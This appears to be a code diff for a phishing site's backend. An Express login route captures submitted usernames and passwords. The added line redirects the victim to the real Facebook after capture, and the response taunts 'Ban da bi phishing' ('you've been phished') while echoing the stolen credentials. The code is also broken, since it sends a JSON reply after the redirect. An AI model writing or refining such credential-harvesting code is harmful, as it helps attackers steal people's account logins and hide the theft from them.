@@ -31,6 +31,8 @@ app.post("/login", async (req, res, next) => {
     username, password
   })
 
+  res.redirect("https://www.facebook.com/")
+
   return res.status(200).json({
     message: "Ban da bi phishing hjhj",
     payload: req.body
